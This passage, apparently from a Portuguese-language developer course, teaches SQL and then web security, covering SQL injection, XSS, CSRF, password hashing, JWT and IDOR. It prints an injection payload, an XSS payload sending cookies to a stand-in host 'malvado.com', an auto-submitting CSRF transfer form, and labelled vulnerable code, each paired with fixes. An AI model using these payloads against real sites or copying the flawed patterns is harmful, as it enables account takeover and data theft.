- **Tabelas se relacionam.** A tabela de pedidos guarda o `id` do cliente em vez de repetir o nome dele. Isso é a **chave estrangeira**.

Criando a tabela:

```sql
CREATE TABLE clientes (
    id     INTEGER PRIMARY KEY,
    nome   TEXT NOT NULL,
    email  TEXT NOT NULL UNIQUE,
    uf     CHAR(2),
    criado DATE DEFAULT CURRENT_DATE
);
```

Cada restrição aí é uma regra que o banco passa a garantir **para sempre**, mesmo que seu código tenha bug:

| Restrição | O que garante |
|-----------|---------------|
| `PRIMARY KEY` | Identifica a linha; único e não nulo |
| `NOT NULL` | O campo nunca fica vazio |
| `UNIQUE` | Não existem dois iguais |
| `DEFAULT` | Valor automático quando você não informa |
| `CHECK (idade >= 0)` | Uma condição sua, verificada em toda gravação |

**Prefira a restrição no banco à validação no código.** O código valida uma vez, no lugar onde você lembrou. O banco valida sempre, em toda gravação, venha de onde vier — inclusive daquele script que você rodou às pressas.

### Aula 9.3 — SELECT: a consulta

O comando que você vai escrever dez mil vezes:

```sql
SELECT nome, email          -- quais colunas quero
FROM clientes               -- de qual tabela
WHERE uf = 'CE'             -- filtrando
ORDER BY nome               -- ordenado por
LIMIT 10;                   -- só os 10 primeiros
```

`SELECT *` traz todas as colunas. Serve para explorar; **em código de verdade, liste as colunas**. Assim você não quebra quando alguém adicionar uma coluna nova, nem traz um campo de 2 MB sem querer.

Filtros do `WHERE`:

```sql
WHERE uf = 'CE'
WHERE idade >= 18
WHERE nome LIKE 'Ana%'           -- começa com "Ana"  (% = qualquer coisa)
WHERE uf IN ('CE', 'RN', 'PB')
WHERE idade BETWEEN 18 AND 65
WHERE email IS NULL              -- atenção: NULL não usa =
WHERE uf = 'CE' AND idade >= 18
WHERE uf = 'CE' OR uf = 'RN'
```

**A pegadinha do NULL.** `NULL` não é zero nem texto vazio: é *desconhecido*. E comparar com desconhecido devolve desconhecido, não falso:

```sql
WHERE email = NULL      -- NUNCA funciona, nem quando o campo é nulo
WHERE email IS NULL     -- é assim
WHERE email IS NOT NULL
```

Isso vale para tudo. `NULL = NULL` também não é verdadeiro. Guarde: **em SQL, nulo se compara com `IS`, nunca com `=`**.

### Aula 9.4 — INSERT, UPDATE e DELETE

```sql
-- Criar
INSERT INTO clientes (nome, email, uf)
VALUES ('Ana Souza', 'ana@exemplo.com', 'CE');

-- Vários de uma vez
INSERT INTO clientes (nome, email, uf) VALUES
    ('Carlos Lima', 'carlos@exemplo.com', 'RN'),
    ('Bia Rocha',   'bia@exemplo.com',    'CE');

-- Alterar
UPDATE clientes
SET uf = 'PB'
WHERE id = 1;

-- Apagar
DELETE FROM clientes
WHERE id = 1;
```

**Atenção — o erro que apaga a base inteira:**

```sql
UPDATE clientes SET uf = 'PB';     -- sem WHERE: muda TODAS as linhas
DELETE FROM clientes;              -- sem WHERE: apaga TODAS as linhas
```

Não há confirmação, não há lixeira, não há desfazer. O banco faz exatamente o que você mandou, em um milhão de linhas, em meio segundo.

O hábito que salva: **escreva sempre como `SELECT` primeiro**, confira o que voltou, e só então troque a primeira palavra.

```sql
SELECT * FROM clientes WHERE id = 1;   -- 1. confere o alvo
DELETE  FROM clientes WHERE id = 1;    -- 2. agora sim
```

### Aula 9.5 — Tipos de dado

```sql
INTEGER          -- números inteiros
DECIMAL(10,2)    -- número exato: 10 dígitos, 2 depois da vírgula
REAL / FLOAT     -- número aproximado
TEXT / VARCHAR   -- texto
DATE             -- 2026-03-15
TIMESTAMP        -- 2026-03-15 14:30:00
BOOLEAN          -- verdadeiro/falso
```

**Para dinheiro, use `DECIMAL`, nunca `FLOAT`.** É a mesma razão do `BigDecimal` no Java e do `Decimal` no Python: ponto flutuante é binário e não representa 0,10 exatamente. Some centavos um milhão de vezes com `FLOAT` e a conta não fecha — e num sistema financeiro, não fechar é problema sério.

Datas: guarde sempre no formato do banco (`DATE`, `TIMESTAMP`), **nunca como texto**. Texto não ordena direito, não aceita subtração, não sabe o que é fuso.

---

## Nível Intermediário

### Aula 9.6 — Relacionamentos e chave estrangeira

Aqui o banco deixa de ser planilha.

```sql
CREATE TABLE pedidos (
    id         INTEGER PRIMARY KEY,
    cliente_id INTEGER NOT NULL,
    total      DECIMAL(10,2) NOT NULL,
    data       DATE NOT NULL,

    FOREIGN KEY (cliente_id) REFERENCES clientes(id)
);
```

A linha `FOREIGN KEY` diz: *o `cliente_id` daqui tem que existir lá em `clientes.id`*. A partir dela, o banco **recusa** um pedido de cliente inexistente, e **recusa** apagar um cliente que ainda tem pedidos. A integridade deixa de depender do seu código lembrar.

**No SQLite, com uma pegadinha que engana muita gente:** ele aceita a declaração acima mas **não a aplica** — por compatibilidade histórica, a verificação vem desligada. Você insere um pedido de cliente inexistente e ele entra numa boa. Precisa ligar, **em toda conexão**:

```sql
PRAGMA foreign_keys = ON;
```

Se você testar integridade no SQLite sem essa linha, vai concluir que a chave estrangeira não serve para nada. No PostgreSQL, ela já vem valendo.

Os três tipos de relacionamento:

| Tipo | Exemplo | Como se faz |
|------|---------|-------------|
| **Um para muitos** | Um cliente tem vários pedidos | A chave estrangeira fica no lado "muitos" |
| **Um para um** | Um usuário tem um perfil | Chave estrangeira com `UNIQUE` |
| **Muitos para muitos** | Um aluno cursa várias matérias, e vice-versa | Uma terceira tabela, de ligação |

O muitos-para-muitos confunde no começo. Não dá para representá-lo em duas tabelas — é preciso uma terceira:

```sql
CREATE TABLE matriculas (
    aluno_id   INTEGER REFERENCES alunos(id),
    materia_id INTEGER REFERENCES materias(id),
    nota       DECIMAL(4,2),

    PRIMARY KEY (aluno_id, materia_id)   -- chave composta: o par é único
);
```

Repare no bônus: a tabela de ligação é o único lugar onde a `nota` cabe. Ela não é do aluno nem da matéria — é da combinação dos dois.

### Aula 9.7 — JOIN

`JOIN` é o que faz o modelo relacional valer a pena: juntar tabelas na hora da consulta.

```sql
SELECT c.nome, p.total, p.data
FROM pedidos p
JOIN clientes c ON p.cliente_id = c.id
WHERE p.data >= '2026-01-01';
```

Lê-se: *pegue os pedidos, e para cada um traga a linha de cliente cujo `id` bate com o `cliente_id`*. O `p` e o `c` são apelidos, para não repetir o nome da tabela.

**Os quatro tipos, e a diferença que importa:**

| Tipo | Traz |
|------|------|
| `INNER JOIN` (ou só `JOIN`) | Só quem tem par nos dois lados |
| `LEFT JOIN` | Todos da tabela da esquerda, com ou sem par |
| `RIGHT JOIN` | Todos da direita, com ou sem par |
| `FULL OUTER JOIN` | Todos dos dois lados |

A diferença entre `INNER` e `LEFT` é a que mais gera bug silencioso. Compare:

```sql
-- Quantos pedidos cada cliente fez?
SELECT c.nome, COUNT(p.id) AS pedidos
FROM clientes c
JOIN pedidos p ON p.cliente_id = c.id      -- INNER
GROUP BY c.nome;
```

```sql
-- A mesma pergunta, com LEFT
SELECT c.nome, COUNT(p.id) AS pedidos
FROM clientes c
LEFT JOIN pedidos p ON p.cliente_id = c.id
GROUP BY c.nome;
```

Suponha 100 clientes, dos quais 30 nunca compraram. O primeiro devolve **70 linhas**; o segundo, **100**, com zero para quem nunca comprou.

Nenhum dos dois está errado — depende da pergunta. Mas se você queria "todos os clientes e quanto compraram" e usou `INNER`, os 30 sumiram do relatório **sem nenhum aviso**. Esse é o bug: não dá erro, só devolve menos.

**Regra prática:** quando a pergunta começa com "todos os X, e...", você quer `LEFT JOIN` a partir de X.

### Aula 9.8 — Agregação: GROUP BY

Agregar é responder perguntas sobre *conjuntos* de linhas, não sobre linhas.

```sql
SELECT COUNT(*)          FROM pedidos;   -- quantos
SELECT SUM(total)        FROM pedidos;   -- soma
SELECT AVG(total)        FROM pedidos;   -- média
SELECT MIN(total), MAX(total) FROM pedidos;
```

Com `GROUP BY`, a mesma conta é feita por grupo:

```sql
SELECT c.uf,
       COUNT(*)     AS qtd_pedidos,
       SUM(p.total) AS faturamento
FROM pedidos p
JOIN clientes c ON c.id = p.cliente_id
GROUP BY c.uf
ORDER BY faturamento DESC;
```

Resultado: uma linha por UF, com a contagem e a soma daquele estado.

**A regra do `GROUP BY`:** toda coluna do `SELECT` precisa estar no `GROUP BY` **ou** dentro de uma função de agregação. Faz sentido — se você agrupou 500 pedidos do Ceará numa linha só, qual `data` o banco deveria mostrar? Não existe resposta.

**Atenção, porque aqui os bancos discordam.** O PostgreSQL recusa a consulta e explica o erro. O **SQLite aceita** e devolve a data de uma linha qualquer do grupo, escolhida por ele — sem aviso. O MySQL depende de configuração.

Isso importa para você agora: o módulo manda começar pelo SQLite, e é justamente ele que deixa passar. Se você escrever uma consulta assim e ela funcionar, **não conclua que está certa** — ela vai quebrar no PostgreSQL do primeiro emprego, ou pior, vai devolver um número plausível e errado. Siga a regra mesmo quando o banco não cobrar.

**`WHERE` contra `HAVING`** — a confusão clássica:

```sql
SELECT c.uf, SUM(p.total) AS faturamento
FROM pedidos p
JOIN clientes c ON c.id = p.cliente_id
WHERE p.data >= '2026-01-01'      -- filtra LINHAS, antes de agrupar
GROUP BY c.uf
HAVING SUM(p.total) > 10000;      -- filtra GRUPOS, depois de agrupar
```

`WHERE` roda antes: escolhe quais pedidos entram na conta. `HAVING` roda depois: escolhe quais resultados aparecem. Você não pode usar `SUM()` no `WHERE`, porque na hora do `WHERE` a soma ainda não existe.

A ordem real de execução, que explica tudo isso:

```
FROM → JOIN → WHERE → GROUP BY → HAVING → SELECT → ORDER BY → LIMIT
```

Repare que o `SELECT` é quase o **último**. É por isso que você não pode usar um apelido criado no `SELECT` dentro do `WHERE`: quando o `WHERE` roda, aquele apelido ainda não nasceu.

### Aula 9.9 — Subconsultas e CTE

Uma consulta dentro da outra:

```sql
-- Clientes que gastaram acima da média
SELECT nome
FROM clientes
WHERE id IN (
    SELECT cliente_id
    FROM pedidos
    GROUP BY cliente_id
    HAVING SUM(total) > (SELECT AVG(total) FROM pedidos)
);
```

Funciona, mas lê-se de dentro para fora e vira sopa rápido. A alternativa moderna é a **CTE** (*Common Table Expression*), com `WITH`:

```sql
WITH gasto_por_cliente AS (
    SELECT cliente_id, SUM(total) AS gasto
    FROM pedidos
    GROUP BY cliente_id
),
media AS (
    SELECT AVG(gasto) AS valor FROM gasto_por_cliente
)
SELECT c.nome, g.gasto
FROM gasto_por_cliente g
JOIN clientes c ON c.id = g.cliente_id
WHERE g.gasto > (SELECT valor FROM media)
ORDER BY g.gasto DESC;
```

Mais linhas, muito mais legível: cada bloco tem nome, e você lê de cima para baixo como um roteiro. **Prefira CTE a subconsulta aninhada** em qualquer coisa que outra pessoa vá ler — inclusive você daqui a três meses.

---

## Nível Avançado

### Aula 9.10 — Normalização

Normalizar é organizar as tabelas para **não repetir dado**. O problema que ela resolve:

```
pedidos (do jeito errado)
┌────┬──────────────┬───────────────────┬──────────┐
│ id │ cliente_nome │  cliente_email    │  total   │
├────┼──────────────┼───────────────────┼──────────┤
│ 1  │ Ana Souza    │ ana@exemplo.com   │  150,00  │
│ 2  │ Ana Souza    │ ana@exemplo.com   │  200,00  │
│ 3  │ Ana Souza    │ ana@exmeplo.com   │   80,00  │  ← digitado errado
└────┴──────────────┴───────────────────┴──────────┘
```

Três problemas nascem daí, e todos têm nome:

- **Anomalia de atualização** — Ana troca de email: você precisa mudar em todas as linhas. Esquecer uma cria duas verdades.
- **Anomalia de inserção** — não dá para cadastrar um cliente que ainda não fez pedido.
- **Anomalia de exclusão** — apagar o último pedido dela apaga também o email dela.

As três primeiras formas normais, em português direto:

| Forma | Regra | Na prática |
|-------|-------|-----------|
| **1FN** | Cada célula guarda um valor só | Nada de `"CE, RN, PB"` numa coluna |
| **2FN** | 1FN + toda coluna depende da chave **inteira** | Só importa quando a chave é composta |
| **3FN** | 2FN + nenhuma coluna depende de outra coluna comum | Se `cidade` determina `uf`, `uf` não fica ali |

Na prática, **3FN resolve 95% dos casos** e é onde você deve parar.

**Quando desnormalizar de propósito.** Normalizar tem preço: mais tabelas, mais `JOIN`, consulta mais lenta. Num relatório que roda milhões de vezes por dia, às vezes se repete dado de caso pensado para evitar junções. Isso é decisão consciente com um problema medido — não é desculpa para não normalizar desde o começo.

### Aula 9.11 — Índices, e por que sua consulta está lenta

Sua consulta funcionava com 100 linhas e agora demora 30 segundos com 2 milhões. Quase sempre é falta de índice.

Sem índice, o banco faz *varredura completa*: lê a tabela inteira, linha por linha, procurando. Com índice, ele consulta uma estrutura ordenada e vai direto. É a diferença entre folhear um livro inteiro e usar o índice remissivo — e é exatamente a diferença entre O(n) e O(log n) do Módulo 13.

```sql
CREATE INDEX idx_pedidos_cliente ON pedidos(cliente_id);
CREATE INDEX idx_pedidos_data    ON pedidos(data);

-- Índice composto: serve para filtros nas duas colunas, nessa ordem
CREATE INDEX idx_pedidos_cli_data ON pedidos(cliente_id, data);
```

**Onde criar índice:** colunas usadas em `WHERE`, em `JOIN` e em `ORDER BY`. Chave primária já tem um automaticamente.

**Por que não indexar tudo:** cada índice ocupa espaço e precisa ser atualizado a cada `INSERT`, `UPDATE` e `DELETE`. Índice demais deixa a escrita lenta para acelerar leitura que ninguém faz.

**A ferramenta que dá a resposta em vez de palpite:**

```sql
-- PostgreSQL: mostra o plano E os tempos medidos
EXPLAIN ANALYZE
SELECT * FROM pedidos WHERE cliente_id = 42;

-- SQLite: sintaxe própria, e só o plano, sem cronometrar
EXPLAIN QUERY PLAN
SELECT * FROM pedidos WHERE cliente_id = 42;
```

Ele mostra o plano que o banco escolheu. No PostgreSQL, se aparecer *Seq Scan* (varredura sequencial) numa tabela grande com filtro, falta índice; *Index Scan* significa que ele está usando. No SQLite, procure `SCAN` contra `SEARCH ... USING INDEX` — mesma leitura, outro vocabulário.

**A armadilha que anula o índice:** aplicar função na coluna filtrada.

```sql
WHERE YEAR(data) = 2026          -- ignora o índice: precisa calcular linha a linha
WHERE data >= '2026-01-01'
  AND data <  '2027-01-01'       -- usa o índice
```

Sempre que possível, deixe a coluna **crua** de um lado do filtro.

### Aula 9.12 — Transações

Transferência bancária: tira 100 de uma conta, põe 100 na outra. Se o programa morrer entre as duas operações, os 100 reais somem do mundo.

```sql
BEGIN;

UPDATE contas SET saldo = saldo - 100 WHERE id = 1;
UPDATE contas SET saldo = saldo + 100 WHERE id = 2;

COMMIT;         -- confirma as duas juntas
-- ROLLBACK;    -- ou desfaz as duas juntas
```

A transação torna as duas operações **uma só**: ou as duas acontecem, ou nenhuma. Não existe meio do caminho, nem se a energia acabar exatamente ali.

Isso é garantido por quatro propriedades, o **ACID**:

| Letra | Nome | Garante |
|-------|------|---------|
| **A** | Atomicidade | Tudo ou nada |
| **C** | Consistência | O banco nunca fica num estado que viola as regras |
| **I** | Isolamento | Transações simultâneas não enxergam a metade uma da outra |
| **D** | Durabilidade | Depois do `COMMIT`, está gravado mesmo se cair a luz |

**Use transação sempre que duas ou mais gravações precisem fazer sentido juntas.** É o mesmo raciocínio do `with` no Python e do `try-with-resources` no Java: garantir que não se termine pela metade.

### Aula 9.13 — SQL, NoSQL e ORM

**NoSQL** é um guarda-chuva para bancos que não são tabelas relacionais:

| Tipo | Exemplo | Bom para |
|------|---------|----------|
| Documento | MongoDB | Dados de formato variável |
| Chave-valor | Redis | Cache, sessão, fila |
| Coluna larga | Cassandra | Escrita em volume enorme |
| Grafo | Neo4j | Relações profundas (rede social, rotas) |

**Quando escolher qual:** se seus dados têm relações e você precisa de consistência — quase todo sistema de negócio — use relacional. NoSQL entra por um motivo concreto: escala de escrita muito alta, formato realmente variável, ou cache. "É mais moderno" não é motivo.

Na prática, o mais comum é usar os dois: PostgreSQL para os dados, Redis para cache e sessão.

**ORM** traduz objetos da sua linguagem em SQL:

```python
# SQLAlchemy — o ORM escreve o SQL por você
clientes = session.query(Cliente).filter(Cliente.uf == 'CE').all()
```

Ele economiza muito código repetido. Mas tem uma armadilha famosa, o **problema N+1**:

```python
for pedido in session.query(Pedido).all():     # 1 consulta
    print(pedido.cliente.nome)                 # +1 consulta POR pedido
```

Mil pedidos viram **mil e uma** consultas ao banco. A página que carregava em 200 ms passa a levar 20 segundos, e nada no código parece errado. A correção é pedir a junção de uma vez (`joinedload` no SQLAlchemy, `select_related` no Django, `JOIN FETCH` no Hibernate).

Você só percebe esse problema se souber o SQL que deveria ter sido gerado. É por isso que SQL vem antes do ORM.

---

## Projetos do Módulo 9

**Projeto 1 — Modelagem de uma loja**
Modele do zero: clientes, produtos, pedidos e itens do pedido. Chaves primárias e estrangeiras, restrições `NOT NULL`, `UNIQUE` e `CHECK`, e o relacionamento muitos-para-muitos entre pedido e produto. Popule com pelo menos 50 clientes e 200 pedidos. Entregue o arquivo `.sql` que cria tudo do zero.

**Projeto 2 — Relatórios**
Sobre a base do Projeto 1, escreva as consultas que respondem: faturamento por mês, dez produtos mais vendidos, ticket médio por estado, clientes que não compram há 90 dias, e o produto mais vendido de cada categoria. Use `JOIN`, `GROUP BY`, `HAVING` e pelo menos uma CTE. Nenhuma dessas respostas deve ser calculada no Python — todas em SQL.

**Projeto 3 — Integração e desempenho**
Conecte sua API do Módulo 4 ou 5 nesse banco, trocando o armazenamento em memória por PostgreSQL. Depois popule uma tabela com 500 mil linhas, rode `EXPLAIN ANALYZE` numa consulta lenta, crie o índice certo e **meça o antes e o depois**. O número é a entrega.

---

## Checklist de saída do Módulo 9

- [ ] Escrevo `SELECT` com `JOIN`, `GROUP BY` e `ORDER BY` sem consultar
- [ ] Sei a diferença entre `INNER` e `LEFT JOIN` e o bug silencioso do primeiro
- [ ] Sei por que `WHERE email = NULL` nunca funciona
- [ ] Sei quando usar `WHERE` e quando usar `HAVING`
- [ ] Modelo um muitos-para-muitos com tabela de ligação
- [ ] Explico as três primeiras formas normais com exemplo meu
- [ ] Uso `EXPLAIN` para descobrir por que uma consulta está lenta
- [ ] Sei o que é transação e quando ela é obrigatória
- [ ] Reconheço o problema N+1 num ORM

---

# MÓDULO 10 — Segurança

> **Dificuldade:** ●●●○○ · **Tempo:** 5 a 6 semanas · **Pré-requisito:** Módulos 3, 4 e 9

**Objetivo:** escrever aplicação que não vaza dado de usuário — e reconhecer, no seu próprio código, as falhas que aparecem em toda auditoria.

Este módulo não é sobre invadir sistema. É sobre **não deixar o seu ser invadido**, que é responsabilidade de quem escreve código, não de um time separado que chega no fim. As falhas abaixo estão entre as mais exploradas do mundo há mais de vinte anos, e continuam no topo porque continuam sendo escritas todo dia por gente que nunca viu uma aula sobre elas.

Aqui isso também virou obrigação legal. A **LGPD** responsabiliza a empresa por vazamento de dado pessoal, e "o programador não sabia" não é defesa.

**Uma frase para carregar pelo resto do módulo:** *toda entrada é hostil até prova em contrário.* Formulário, parâmetro de URL, cabeçalho HTTP, arquivo enviado, resposta de outra API — tudo que não nasceu dentro do seu código é suspeito.

---

## Nível Básico

### Aula 10.1 — O modelo mental

Iniciante pensa: *"o formulário só aceita número, então só vai chegar número"*.

Falso. O formulário é a interface **sugerida**. Nada obriga o atacante a usá-la — ele manda a requisição direto:

```bash
curl -X POST https://seusite.com/api/pedido \
     -d '{"quantidade": -5, "preco": 0.01, "admin": true}'
```

Seu HTML com `type="number"` e `min="1"` não participou dessa conversa. Validação no navegador é **conveniência para o usuário honesto**, nunca segurança.

**A regra:** valide no cliente para dar boa experiência; valide no servidor porque é lá que a segurança existe. E o servidor não pode confiar em nada que veio do cliente — nem no preço, nem no id do usuário, nem em um campo escondido.

**Os três princípios que geram quase todas as práticas deste módulo:**

| Princípio | Quer dizer |
|-----------|------------|
| **Menor privilégio** | Cada parte recebe só o acesso mínimo. O usuário do banco da aplicação web não precisa poder apagar tabela. |
| **Defesa em profundidade** | Várias camadas. Se uma falhar, outra segura. |
| **Falhe fechado** | Deu erro, negue o acesso. Nunca libere "por precaução". |

O terceiro é o mais violado. Um `try/except` que engole o erro de verificação de permissão e segue em frente **abriu o sistema** — silenciosamente.

### Aula 10.2 — SQL Injection

A falha mais famosa da história, e ainda encontrada em produção toda semana.

Considere um login escrito assim:

```python
# CÓDIGO VULNERÁVEL — não escreva isso
consulta = f"SELECT * FROM usuarios WHERE email = '{email}' AND senha = '{senha}'"
cursor.execute(consulta)
```

Com dados normais, funciona. Agora veja o que o atacante digita no campo de email:

```
' OR '1'='1' --
```

A consulta que chega ao banco vira:

```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND senha = '...'
```

Leia com calma o que aconteceu:

- A aspa fechou o texto do email antes da hora
- `OR '1'='1'` é sempre verdadeiro, então **toda linha** da tabela passa no filtro
- `--` comenta o resto, e a verificação de senha some da consulta

Resultado: entrou como o primeiro usuário da tabela, tipicamente o administrador — **sem senha**. E variações do mesmo truque conseguem ler outras tabelas ou apagar dados.

**A causa raiz:** o código misturou **comando** e **dado** numa string só. O banco recebeu tudo junto e não teve como saber o que era instrução e o que era digitação do usuário.

**A correção — parâmetros:**

```python
# CORRETO
consulta = "SELECT * FROM usuarios WHERE email = %s AND senha_hash = %s"
cursor.execute(consulta, (email, senha_hash))
```

Repare na diferença: o `%s` **não é substituição de texto** — apesar de parecer, e essa semelhança é a maior fonte de confusão aqui. Ele não é o `%` de formatação do Python. É um marcador que a biblioteca do banco entende: o comando vai ao servidor **separado** dos valores, e o valor é tratado como valor, sempre. Se o atacante mandar `' OR '1'='1' --`, o banco procura literalmente um email com esse nome, não acha, e devolve zero linhas.

**O marcador muda conforme a biblioteca**, e copiar o errado dá erro de sintaxe:

| Biblioteca | Marcador |
|------------|----------|
| `psycopg2` (PostgreSQL) | `%s` |
| `sqlite3` (o do Módulo 9) | `?` |
| `mysql-connector` | `%s` |

```python
# sqlite3 — o mesmo código, com o marcador dele
cursor.execute("SELECT * FROM usuarios WHERE email = ? AND senha_hash = ?", (email, senha_hash))
```

O que **nunca** muda é a regra: os valores vão no segundo argumento, jamais concatenados na string.

**Nunca monte SQL com concatenação ou f-string.** Nem "só neste caso", nem "esse valor vem de dentro". Use parâmetros sempre — é mais curto, mais rápido e seguro.

ORM protege disso por padrão, mas some a proteção quando você escreve SQL cru nele:

```python
Usuario.objects.raw(f"SELECT * FROM usuarios WHERE id = {id}")   # vulnerável
Usuario.objects.raw("SELECT * FROM usuarios WHERE id = %s", [id]) # correto
```

### Aula 10.3 — XSS

**Cross-Site Scripting** é injetar JavaScript na página que outra pessoa vai abrir. Mesma causa raiz do anterior, outro alvo: aqui o dado do usuário é interpretado como **código pelo navegador**.

Um campo de comentário que salva e exibe assim:

```javascript
// VULNERÁVEL
divComentarios.innerHTML = comentario;
```

O atacante escreve como comentário:

```html
<img src=x onerror="fetch('https://malvado.com/roubar?c='+document.cookie)">
```

A imagem falha de propósito, o `onerror` dispara, e **o cookie de sessão de cada visitante é enviado para o atacante**. Com o cookie, ele entra nas contas sem precisar de senha.

**A correção — trate texto como texto:**

```javascript
divComentarios.textContent = comentario;      // seguro: não interpreta HTML
```

Você viu essa diferença no Módulo 3, na Aula 3.7. Ali ela parecia detalhe de estilo. É segurança.

Quando você **precisa** aceitar HTML — um editor de texto rico, por exemplo — não escreva o filtro você mesmo. Use uma biblioteca de sanitização testada, como o DOMPurify:

```javascript
divComentarios.innerHTML = DOMPurify.sanitize(comentario);
```

**Por que não escrever seu próprio filtro:** já tentaram, por décadas, e sempre há um caso que escapa. `<img onerror>`, `<svg onload>`, `javascript:` em `href`, HTML malformado que o navegador conserta de um jeito inesperado. Esta é uma das poucas áreas onde "não invente, use a biblioteca" é resposta definitiva.

Frameworks modernos (React, Vue, Angular) escapam por padrão. Mas todos têm uma porta dos fundos, e ela avisa no nome:

```jsx
<div dangerouslySetInnerHTML={{__html: comentario}} />   // React avisou
```

**Camada extra:** o cabeçalho `HttpOnly` no cookie impede o JavaScript de lê-lo. Assim, mesmo com um XSS, o cookie de sessão não vaza — é defesa em profundidade na prática.

### Aula 10.4 — CSRF

**Cross-Site Request Forgery** é fazer o navegador da vítima executar uma ação **autenticada** sem que ela perceba.

O mecanismo depende de um detalhe do navegador: **ele envia os cookies do seu site automaticamente**, em qualquer requisição para lá — inclusive numa disparada por outro site.

A vítima está logada no banco. Ela abre outra aba, num site qualquer, que contém:

```html
<form action="https://banco.com/transferir" method="POST" id="f">
    <input type="hidden" name="para" value="conta-do-atacante">
    <input type="hidden" name="valor" value="5000">
</form>
<script>document.getElementById('f').submit();</script>
```

O formulário se envia sozinho. O navegador anexa o cookie do banco, porque é assim que ele funciona. O banco recebe uma requisição autenticada e válida — e transfere.

**As correções, e todas valem a pena juntas:**

```python
# 1. Token anti-CSRF: valor imprevisível, exigido em toda ação que muda estado
<input type="hidden" name="csrf_token" value="{{ token }}">
```

O site atacante não consegue adivinhar o token, e não consegue lê-lo do seu site (a política de mesma origem impede).

```python
# 2. SameSite no cookie — o navegador não envia em requisição de outro site
response.set_cookie("sessao", valor, samesite="Lax", httponly=True, secure=True)
```

`SameSite=Lax` é o padrão nos navegadores atuais e já resolve a maior parte dos casos. Não dispensa o token: navegador antigo e configuração diferente ainda existem.

```
3. GET nunca muda estado.
```

Esta é regra de arquitetura, não de segurança — mas evita a versão mais boba do ataque, em que um `<img src="banco.com/transferir?valor=5000">` faz a transferência. Se `GET` só lê, uma tag de imagem não causa dano.

Todo framework sério traz proteção CSRF pronta. **Ligada.** O erro comum é desligá-la porque "estava dando erro no formulário".

---

## Nível Intermediário

### Aula 10.5 — Senhas

**Nunca guarde senha em texto puro.** Isso é o mínimo, e ainda assim vaza empresa grande fazendo exatamente isso.

Também não basta guardar o "hash":

```python
# ERRADO — MD5 e SHA-1 são rápidos demais, e isso é o problema
import hashlib
senha_hash = hashlib.md5(senha.encode()).hexdigest()
```

Por que rapidez é defeito aqui: o atacante que roubou seu banco vai testar bilhões de senhas por segundo contra os hashes. MD5 e SHA-256 foram feitos para ser rápidos — e ajudam o atacante muito mais que você.

**O certo é um algoritmo feito para ser lento e com sal:**

```python
import bcrypt

# Ao cadastrar
senha_hash = bcrypt.hashpw(senha.encode(), bcrypt.gensalt())

# Ao entrar
if bcrypt.checkpw(senha_digitada.encode(), senha_hash):
    ...
```

Duas propriedades fazem o trabalho:

- **Lento de propósito.** Cada tentativa custa tempo real. Bilhões por segundo viram milhares.
- **Sal** (*salt*) — um valor aleatório por senha, guardado junto ao hash. Sem ele, duas pessoas com a mesma senha teriam o mesmo hash, e uma tabela pré-calculada (*rainbow table*) quebraria as duas de uma vez. Com sal, cada senha precisa ser atacada individualmente.

Use **bcrypt**, **argon2** ou **scrypt**. Argon2 é o mais recomendado hoje; bcrypt é o mais disponível. Qualquer um dos três está certo.

**O resto da política de senha, em ordem de importância real:**

- Exija **comprimento** (12+), não "um símbolo e uma maiúscula". Regra complicada produz `Senha@123`, que qualquer lista quebra.
- Compare com listas de senhas já vazadas e recuse as conhecidas
- Limite tentativas de login, com espera crescente
- Ofereça segundo fator

E: **nunca envie senha por email**, nem no cadastro nem na recuperação. Recuperação é feita com link temporário de uso único.

### Aula 10.6 — Sessão, token e JWT

Depois do login, como o servidor sabe quem você é na próxima requisição? HTTP não lembra nada sozinho.

**Sessão no servidor** — o caminho tradicional:

```
1. Login válido → servidor cria a sessão e guarda no banco/Redis
2. Devolve um cookie com o identificador da sessão
3. A cada requisição, o navegador manda o cookie
4. O servidor consulta e sabe quem é
```

**JWT** — o token que carrega a informação:

```
cabeçalho.dados.assinatura
eyJhbGci...  .  eyJzdWIiOiIxMjM0...  .  SflKxwRJSMeKK...
```

O servidor não guarda nada: ele **verifica a assinatura** e confia no conteúdo.

| | Sessão no servidor | JWT |
|---|---|---|
| Estado | No servidor | No token |
| Revogar na hora | Fácil — apaga a sessão | **Difícil** — vale até expirar |
| Escala horizontal | Precisa de armazenamento compartilhado | Qualquer servidor valida |
| Tamanho | Cookie pequeno | Token maior, vai em toda requisição |

**Os erros clássicos de JWT, e são graves:**

```python
# ERRADO — aceita token sem verificar assinatura
dados = jwt.decode(token, options={"verify_signature": False})
```

Sem verificar a assinatura, qualquer um edita o conteúdo e vira administrador. O `alg: none` — um token que se declara sem assinatura — já derrubou bibliotecas inteiras.

```python
# CORRETO
dados = jwt.decode(token, CHAVE_SECRETA, algorithms=["HS256"])
```

Repare no `algorithms`: fixar a lista impede o atacante de escolher o algoritmo por você.

**Outros dois:** JWT não é criptografado, é **assinado** — qualquer um lê o conteúdo com um decodificador de base64, então **nunca coloque dado sensível ali**. E dê expiração curta (minutos a poucas horas), com token de renovação separado, justamente porque revogar é difícil.

**Qual escolher:** se você tem dúvida, use **sessão no servidor**. É mais simples e revogar é trivial. JWT brilha em API sem estado e vários serviços — e cobra o preço da revogação.

### Aula 10.7 — Autorização e IDOR

**Autenticação** é *quem é você*. **Autorização** é *o que você pode*. Confundir as duas gera a falha mais comum em API moderna.

```python
# VULNERÁVEL — verifica que está logado, não que o pedido é dele
@app.get("/api/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, usuario = Depends(usuario_logado)):
    return db.buscar_pedido(pedido_id)
```

O usuário logado troca a URL de `/api/pedidos/1001` para `/api/pedidos/1002` e **lê o pedido de outra pessoa** — com nome, endereço e valor. Nenhuma barreira foi quebrada: o sistema simplesmente nunca perguntou se aquele pedido era dele.

Isso se chama **IDOR** (*Insecure Direct Object Reference*), e é encontrado em auditoria com uma frequência constrangedora.

```python
# CORRETO — a posse faz parte da consulta
@app.get("/api/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, usuario = Depends(usuario_logado)):
    pedido = db.buscar_pedido(pedido_id)
    if not pedido or pedido.cliente_id != usuario.id:
        raise HTTPException(404)      # 404, não 403
    return pedido
```

Dois detalhes que importam:

- **Verifique a posse em toda rota que recebe um id.** Toda. Uma esquecida basta.
- **Devolva 404, não 403.** Um 403 confirma que o pedido 1002 existe — informação que o atacante usa para mapear a base. O 404 não conta nada.

**Sobre id sequencial:** trocar para UUID torna o ataque mais trabalhoso, mas **não é a correção**. É camada extra. A correção é verificar a posse.

